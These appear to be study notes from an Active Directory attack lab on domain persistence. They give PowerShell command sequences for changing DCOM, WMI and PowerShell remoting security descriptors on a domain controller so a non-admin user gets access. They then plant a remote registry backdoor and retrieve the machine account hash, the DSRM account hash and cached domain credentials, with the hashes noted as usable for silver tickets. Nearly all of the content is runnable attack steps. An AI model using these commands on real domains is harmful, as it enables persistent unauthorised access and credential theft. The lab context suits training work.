Persistence using ACLs - Security Descriptors

• Modify DCOM and Namespaces ACLs to provide non-admin users with the ability to access security objects.
• Run the powershell with DA access.
   ◇ Import-module Set-RemoteWMI.ps1
      ▪ To enable full access for DCOM and WMI on local machine
         - Set-RemoteWMI -Username Username -Verbose
      ▪ To enable full access for DCOM and WMI on remote machine without explicit credentials for "root\cimv2" namespace:
         - Set-RemoteWMI -Username Username -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
      ▪ Trying to run wmi commands after getting the access on PS session with std user access:
         - Get-wmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
      ▪ On Remote Machine, remove the permissions:
         - Set-RemoteWMI -Username Username -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Remove

•  To modify ACLs security descriptors that allows to access security objects through PowerShell remoting
   ◇ Import Set-RemotePSRemoting.ps1
      ▪ To enable full access for DCOM and WMI on local machine
         - Set-RemotePSRemoting -Username Username -Verbose
      ▪ To enable full access for DCOM and WMI on remote machine without explicit credentials:
         - Set-RemotePSRemoting -Username Username  -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
      ▪ Trying to run PSRemoting commands after getting the access on PS session with std user access:
         - Invoke-Command -ScriptBlock {whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
      ▪ On Remote Machine, remove the permissions:
         - Set-RemotePSRemoting -Username Username  -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Remove


•  To modify permission or key values on remote registry using DAMP
   ◇ Modifies WMI and some registry which will allow user to access registry on DC without any Admin rights
   ◇ Open PS session with DA rights
      ▪ Import-Module Add-RemoteRegBackdoor.ps1 (From DAMP folder)
         - Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee Username
   ◇ Open PS with std user rights
      ▪ Import-Module RemoteHashRetrieval.ps1 (From DAMP folder)
         - Retrieve Machine account hash with above specified user rights: (This hash can be used for silver tickets)
            → Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
         - Retrieve local account hash with above specified user rights: (Also known as DSRM local account password)
            → Get-RemoteLocalAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
         - Retrieve Domain Cached credentials with above specified user rights:
            → Get-RemoteCachedCredentials -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
